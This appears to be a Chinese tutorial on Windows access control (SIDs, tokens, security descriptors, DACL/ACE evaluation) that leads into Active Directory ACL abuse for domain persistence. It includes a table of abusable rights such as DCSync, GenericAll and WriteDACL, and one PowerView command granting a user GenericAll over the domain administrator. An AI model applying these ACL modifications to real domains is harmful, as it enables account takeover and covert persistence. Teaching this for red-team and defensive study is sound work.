  安全主体是 Windows / Active Directory 中**可以被认证、可以被授权、可以出现在 ACL 权限列表里的对象**，简单说就是“谁可以访问资源”。常见安全主体包括用户账号、计算机账号、服务账号、组、本地内置账号等。系统在判断某个对象能不能访问文件、共享、注册表、AD 对象、GPO 等资源时，看的不是名字本身，而是这个安全主体对应的身份信息和它所属的组权限。因此，在域权限维持和 ACL 滥用里，我们经常关注“哪个安全主体对哪个对象拥有什么权限”，例如某个普通用户是否对 `Domain Admins` 组拥有 `WriteDACL` 或 `AddMember` 权限。

#### 安全标识符（SID）

  SID，全称 Security Identifier，是 Windows 用来**唯一标识安全主体的编号**。用户名、组名、计算机名都可以改，但 SID 通常才是系统真正用于权限判断的身份标识。一个典型 SID 类似 `S-1-5-21-xxx-xxx-xxx-500`，前面的部分通常表示域或本地机器，最后的 RID 用来标识具体账号或组，例如 `500` 通常是内置 Administrator，`512` 是 Domain Admins，`519` 是 Enterprise Admins。系统做访问控制时，会把用户自己的 SID、所属组 SID、SIDHistory 等放进访问令牌里，然后和资源 ACL 中的 SID 进行匹配，所以 SID 是理解 Windows 权限、ACL、SIDHistory、票据 PAC 和域权限维持的核心基础。

#### Windows 访问控制模型

  Windows 访问控制模型可以理解为：用户登录后，系统会为该用户生成访问令牌 Token，里面包含用户 SID、所属组 SID、权限特权 Privileges 等身份信息；当用户访问文件、注册表、进程、服务、AD 对象等安全对象时，系统会读取该对象的安全描述符 Security Descriptor，重点检查其中的 DACL，也就是访问控制列表；DACL 由多条 ACE 组成，每条 ACE 规定某个 SID 被允许或拒绝哪些权限。最终，Windows 会把 Token 里的 SID 与对象 DACL 中的 ACE 逐条匹配，结合拒绝优先、允许授权、完整性级别等规则，决定这次访问是允许还是拒绝。简单记：**Token 代表“你是谁”，Security Descriptor 代表“资源允许谁做什么”，Access Check 就是把两者进行匹配判断。**

![image-20260601233042750](/img/域内权限维持专栏/image-20260601233042750.png)

  这里看图涉及到了token和安全描述符

  Token（访问令牌）和安全描述符（Security Descriptor）是 Windows 访问控制模型里的两个核心概念：Token 代表“访问者是谁”，它在用户登录认证成功后由系统生成，里面包含用户 SID、所属组 SID、特权权限、完整性级别、会话信息等；安全描述符代表“资源允许谁访问”，它附着在文件、注册表、进程、服务、AD 对象等安全对象上，里面包含对象所有者、DACL、SACL 等信息，其中 DACL 由多条 ACE 组成，用来规定哪些 SID 被允许或拒绝哪些操作。当用户访问某个对象时，Windows 会把 Token 中的用户 SID 和组 SID 拿去和对象安全描述符里的 DACL 逐条匹配，最终判断是允许访问还是拒绝访问。简单理解就是：Token 是用户的“身份证和权限包”，安全描述符是资源的“门禁规则”，访问检查就是拿身份证去对门禁规则。



#### ACL的介绍

​    **访问控制列表（ACL，Access Control List）** 是 Windows 用来描述“谁可以对某个资源做什么”的权限规则集合，它通常存在于对象的安全描述符中。ACL 由多条 **ACE（访问控制项）** 组成，每条 ACE 都会指定一个安全主体的 SID，以及对应的允许或拒绝权限，比如读取、写入、执行、修改权限、完全控制等。当用户访问文件、注册表、服务、进程或 AD 对象时，系统会拿用户 Token 中的 SID 和 ACL 里的 ACE 进行匹配，从而判断是否允许访问。简单理解：**ACL 就是资源的门禁表，ACE 是门禁表中的每一条规则，SID 是规则里指定的具体人或组。**

##### ACL 访问判断流程

```
用户/进程发起访问请求
例如：读取文件、修改注册表、访问 AD 对象
        ↓
系统查看访问者 Token
Token 中包含：
用户 SID、组 SID、权限特权、完整性级别等
        ↓
系统读取目标对象的安全描述符
Security Descriptor 中包含：
Owner、Group、DACL、SACL
        ↓
重点检查 DACL
DACL 里面有多条 ACE
每条 ACE 说明：
哪个 SID 被允许/拒绝哪些权限
        ↓
逐条匹配 ACE
拿 Token 里的 SID / 组 SID
去匹配 ACE 里的 SID
        ↓
判断权限结果
如果命中 Deny ACE，通常优先拒绝
如果 Allow ACE 覆盖了所需权限，则允许
如果没有任何 ACE 授权，则默认拒绝
        ↓
返回结果
Access Granted / Access Denied
```

  这个主要记得拒绝的规则是优先于允许的。 给一个简单的案例简单理解，假如moon要执行文件操作的功能

```
moon 的 Token：
\- moon 自己的 SID
\- Domain Users 组 SID
\- 普通用户权限

文件 DACL：
ACE1：允许 Domain Users 读取
ACE2：拒绝 Domain Users 写入
ACE3：允许 Administrators 完全控制
```

最终结果就是可读取不给写入。如果是下面这个的情况的话，也可能不可读取。DACL顺序虽然是从上到下读取。**Windows 的规范 DACL（canonical order）** 里，系统通常会把它整理成拒绝在上，允许在后。

```
ACE2：读取 Domain Users 读取
ACE1：拒绝 Domain Users 读取
```

### 滥用复现

  以下是比较值得关注的权限滥用。

| 权限类别     | 权限 / 属性                                | 作用                                       | 典型风险                                             |
| ------------ | ------------------------------------------ | ------------------------------------------ | ---------------------------------------------------- |
| **属性权限** | `member`                                   | 可以修改安全组成员                         | 将任意用户、组、机器加入目标组，例如加入高权限组     |
| **属性权限** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 可以修改目标对象的 RBCD 配置               | 配置资源约束委派，从而冒充用户访问目标服务           |
| **扩展权限** | `DCSync`                                   | 可以通过目录复制接口同步域内数据           | 获取域内任意用户 Hash，包括 `krbtgt`、域管、服务账号 |
| **扩展权限** | `User-Force-Change-Password`               | 可以在不知道原密码的情况下重置目标用户密码 | 接管目标用户账号，尤其是高权限用户                   |
| **基本权限** | `GenericWrite`                             | 可以修改目标对象的大部分属性               | 写 SPN、写委派属性、写登录脚本、写关键属性           |
| **基本权限** | `GenericAll`                               | 对目标对象完全控制                         | 几乎等价于拥有该对象的管理员权限                     |
| **基本权限** | `WriteOwner`                               | 可以修改目标对象所有者                     | 将 Owner 改成自己后，进一步接管 DACL                 |
| **基本权限** | `WriteDACL`                                | 可以修改目标对象的访问控制列表             | 给自己添加任意 ACE，最终完全控制目标对象             |

#### GenericAll 权限滥用

  GenericAll 权限就是完全控制权，拥有了这个权限，就拥有了对目标安全对象的完整控制权，这里分四个场景讨论，应用于用户，组，机器账户，域来讨论。

##### 应用于User用户

```

//添加 test 用户对域管理员 administrator 的 GenericAll 权限
Add-DomainObjectAcl -TargetIdentity administrator -PrincipalIdentity test -Rights All -Verbose

#### GenericWrite 权限

  GenericWrite 权限就是可以修改目标安全对象的所有属性。因此，就可以修改目标对象的 member、msDS-AllowedToActOnBehalfOfOtherIdentity 等属性。但是不能赋予GenericWrite 权限不能赋予 User-Force-Change-Password 和 DCSync 等扩展权限。  这里对应gui界面的按钮---写入全部属性

#### WriteDACL 权限

  WriteDACL 权限就是可以修改目标对象的 DACL，拥有了这个权限就可以往指定安全对象写入任何的 ACE，从而完全控制该安全对象，对应gui界面的按钮是-----修改权限

#### WriteOwner 权限

  WriteOwner 权限就是可以修改目标对象的 Owner 属性，该权限可以修改指定安全对象的 Onwer 属性为任意用户。而 Owner 默认拥有 WriteDACL 等权限，因此就可以利用 WriteDACL 的利用方式，对应gui界面按钮--------修改所有者
